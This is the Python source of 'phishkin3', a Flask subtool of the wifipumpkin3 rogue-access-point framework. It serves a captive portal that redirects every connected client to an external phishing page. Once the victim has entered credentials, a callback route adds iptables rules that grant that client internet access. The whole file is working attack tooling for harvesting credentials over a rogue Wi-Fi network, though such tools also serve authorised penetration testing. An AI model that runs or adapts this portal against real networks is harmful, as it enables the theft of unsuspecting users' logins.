from flask import Flask, request, redirect, render_template
from urllib.parse import urlencode, unquote
from wifipumpkin3.core.utility.collection import SettingsINI
import wifipumpkin3.core.utility.constants as C
import sys
import subprocess
import argparse


app = Flask(__name__)
REDIRECT = None
URL_REDIRECT_AFTER_LOGIN = None
URL_PHISHINGCLOUD = None
PORT = 80
config = None
config_pk = SettingsINI(C.CONFIG_PK_INI)


def login_user(ip, iptables_binary_path):
    subprocess.call(
        [iptables_binary_path, "-t", "nat", "-I", "PREROUTING", "1", "-s", ip, "-j", "ACCEPT"]
    )
    subprocess.call([iptables_binary_path, "-I", "FORWARD", "-s", ip, "-j", "ACCEPT"])


@app.route("/login", methods=["GET", "POST"])
def login():
        global  URL_PHISHINGCLOUD, config
        sys.stdout.write(
            f"Login:: User: {request.remote_addr} redirecting to {URL_PHISHINGCLOUD}\n"
        )
        sys.stdout.flush()
        return redirect(URL_PHISHINGCLOUD, code=302)

@app.route("{}".format(config_pk.get("settings", "allow_user_login_endpoint")), methods=["GET", "POST"])
def verifyUserAfterPhishingLogin():
    global  URL_PHISHINGCLOUD, config
    sys.stdout.write(
        f"Verify:: Allow internet connection for use {request.remote_addr}\n"
    )
    sys.stdout.write(
        f"Verify:: User: {request.remote_addr} redirecting to {URL_REDIRECT_AFTER_LOGIN}\n"
    )
    sys.stdout.flush()
    login_user(request.remote_addr, config.get("iptables", "path_binary"))
    return redirect(URL_REDIRECT_AFTER_LOGIN, code=302) 

@app.route("/favicon.ico")
def favicon():
    return app.send_static_file("templates/favicon.ico")


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
    global REDIRECT, PORT
    if PORT != 80:
        return redirect(
            "http://{}:{}/login?".format(REDIRECT, PORT) + urlencode({"orig_url": request.url})
        )        
    return redirect(
        "http://{}/login?".format(REDIRECT) + urlencode({"orig_url": request.url})
    )


# https://stackoverflow.com/questions/15008758/parsing-boolean-values-with-argparse
def str2bool(v):
    if isinstance(v, bool):
        return v
    if v.lower() in ("yes", "true", "t", "y", "1"):
        return True
    elif v.lower() in ("no", "false", "f", "n", "0"):
        return False
    else:
        raise argparse.ArgumentTypeError("Boolean value expected.")


_version = "1.0.2"


def main():
    global REDIRECT, URL_REDIRECT_AFTER_LOGIN, URL_PHISHINGCLOUD, PORT, config
    print("[*] phishkin3 v{} - subtool from wifipumpkin3".format(_version))
    parser = argparse.ArgumentParser(
        description="phishkin3 - \
    Server to create captive portal with external phishing page\n doc: "
    )
    parser.add_argument(
        "-r",
        "--redirect",
        dest="redirect",
        help="IpAddress from gataway captive portal",
    )
    parser.add_argument(
        "-p",
        "--port",
        dest="port",
        default=80,
        help="The port for captive portal",
    )
    parser.add_argument(
        "-cU",
        "--cloud-url-phishing",
        dest="cloud_url",
        default=None,
        help="cloud url phishing domain page",
    )
    parser.add_argument(
        "-rU",
        "--redirect-url",
        dest="redirect_url",
        default=None,
        help="Url for redirect after user insert the credentials on phishing page",
    )
    parser.add_argument("-v", "--version", dest="version", help="show version the tool")
    args = parser.parse_args()
    REDIRECT = args.redirect
    URL_PHISHINGCLOUD = args.cloud_url
    URL_REDIRECT_AFTER_LOGIN = args.redirect_url
    PORT = args.port
    
    config = SettingsINI(C.CONFIG_INI)

    app.run(REDIRECT, port=args.port)
